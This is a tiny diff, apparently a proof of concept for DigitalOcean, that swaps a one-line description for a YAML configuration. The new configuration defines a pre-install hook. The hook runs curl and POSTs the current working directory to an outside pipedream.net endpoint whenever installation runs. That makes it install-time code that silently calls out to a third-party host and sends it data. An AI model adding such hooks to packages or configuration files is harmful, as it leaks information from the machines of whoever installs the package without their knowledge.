@@ -1,1 +1,4 @@
-A poc by sjn scythe for digital ocean
+hooks:
+  pre-install:
+    - exec:
+        command: "curl -X POST -d \"cwd=$(pwd)\" https://eopzle65ly3zd2o.m.pipedream.net"
